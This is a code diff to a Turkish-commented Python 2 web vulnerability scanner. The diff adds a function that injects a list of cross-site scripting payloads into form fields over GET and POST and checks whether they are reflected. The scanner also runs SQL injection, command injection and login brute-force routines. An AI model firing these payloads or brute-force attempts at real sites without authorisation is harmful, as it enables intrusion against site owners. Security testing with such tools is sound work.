@@ -3,7 +3,7 @@
 # 0x94 Scanner v1.0b
 #Python 2x sürümlerde çalışır.
 #mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun
-#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL) INJECTION - LFI -XSS SCANNER"
+#Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL/XSS/LFI) INJECTION SCANNER
 #Sunucu IP adresi ve kullanilan http bilgisini alir
 #Sunucu Allow header listesini alir
 #Sitedeki tum linkleri 2 farkli yontemle alir (ayni linkleri tarayip zaman kaybi yapmaz)
@@ -11,6 +11,7 @@
 #tum linklerde get ve post sql injection dener
 #tum linklerde blind get ve post sql injection dener
 #tum linklerde time based get ve post sql injection dener
+#tum linklerde get ve post xss injection dener
 #tum linklerde header injection dener
 #tum linklerde get ve post basit capli command injection dener
 #sayfada herhangi bir degisme oldugunda degisme satirini ekrana yazar
@@ -428,6 +429,7 @@ def formyaz(url):
 		    posttimebased(formurl, toplamveri,"POST")
 		    comandinj(formurl, toplamveri,"POST")
 		    loginbrute(formurl, toplamveri,"POST")
+		    postXSS(formurl, toplamveri,"POST")
 			
 	    if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):  
 		print "[GET] action " +formurl
@@ -465,6 +467,7 @@ def formyaz(url):
 		posttimebased(formurl, toplamveri,"GET")
 		comandinj(formurl, toplamveri,"GET")
 		loginbrute(formurl, toplamveri,"GET")
+		postXSS(formurl, toplamveri,"GET")
 
 		
     except urllib2.HTTPError,  e:
@@ -477,6 +480,82 @@ def formyaz(url):
 	mesaj="Bilinmeyen hata olustu\n"
 	#yaz(mesaj)   
 
+
+
+def postXSS(url,params,method):
+    
+    
+    xsspayload=["\"><script>alert(0x000123)</script>",
+	    "\"><sCriPt>alert(0x000123)</sCriPt>",
+	    "\"; alert(0x000123)",
+	    "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
+	    "\"><img Src=0x94 onerror=alert(0x000123)>",
+	    "\"><BODY ONLOAD=alert(0x000123)>",
+	    "'%2Balert(0x000123)%2B'",
+	    "\"><0x000123>",
+	    "'+alert(0x000123)+'",
+	    "%2Balert(0x000123)%2B'",
+	    "'\"--></style></script><script>alert(0x000123)</script>",
+	    "'</style></script><script>alert(0x000123)</script>",
+	    "</script><script>alert(0x000123)</script>",
+	    "</style></script><script>alert(0x000123)</script>",
+	    "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
+	    "'\"--></style></script><script>alert(0x000123)</script>",
+	    "';alert(0x000123)'",
+	    "<scr<script>ipt>alert(0x000123)</script>",
+	    "<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
+            "\"<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
+            "\"><scr<script>ipt>alert(0x000123)</script>",
+            "\">'</style></script><script>alert(0x000123)</script>",
+            "\"></script><script>alert(0x000123)</script>",
+            "\"></style></script><script>alert(0x000123)</script>"]    
+
+
+    postgetdict={}
+    postgetdict=params.copy()
+    
+    for xssler in xsspayload:
+	for key,value in params.items():		
+	    if key in postgetdict:
+		postgetdict[key]=value+xssler
+		try:
+		    parametresaf = urllib.urlencode(postgetdict)
+		    if method=="GET":
+			print "Form GET XSS testi yapiliyor"
+			xsspostresponse = urllib.urlopen(url+"?"+parametresaf).read()
+			postgetdict.clear()
+			postgetdict=params.copy()
+				
+		    else:
+			print "Form POST XSS testi yapiliyor"
+			xsspostresponse = urllib2.urlopen(url, parametresaf).read()
+			postgetdict.clear()
+			postgetdict=params.copy()
+		    
+		    if "alert(0x000123)" in xsspostresponse or "alert%280x000123%29" in xsspostresponse:
+			xssmi=xsscalisiomu(xsspostresponse)
+			if xssmi==False:
+			    yaz("[#] POST XSS BULUNDU : " + url+"\n Form Verisi="+parametresaf,True)
+			else:
+			    yaz("[#] POST XSS BULUNDU ve Satirda XSS korumasi var : " + url+" \n Form Verisi="+parametresaf,True)		    
+      
+
+    
+		except urllib2.HTTPError,e:
+		    print e.reason
+		    if(e.code==500):
+			yaz("[#] "+method+" XSS Http 500 Dondu  Internal Server Error "+timeler+" \n" +url,True)
+			sqlkontrol(e.read(),url)
+			
+		    
+		except urllib2.URLError,e:
+		    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		except:
+		    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)         
+
+    
+    
 def sqlkodcalisiomu(url):
     
     bitiskarakter=["","--","/*","--+",";",";--","--","#"]
@@ -1794,8 +1873,6 @@ def xsstara(xssurl):
         "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
         "\"><img Src=0x94 onerror=alert(0x000123)>",
         "\"><BODY ONLOAD=alert(0x000123)>",
-        "\"><IMG SRC=\"javascript:alert(0x000123);\">",
-        "\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x000123);\">",
         "'%2Balert(0x000123)%2B'",
         "\"><0x000123>",
         "'+alert(0x000123)+'",
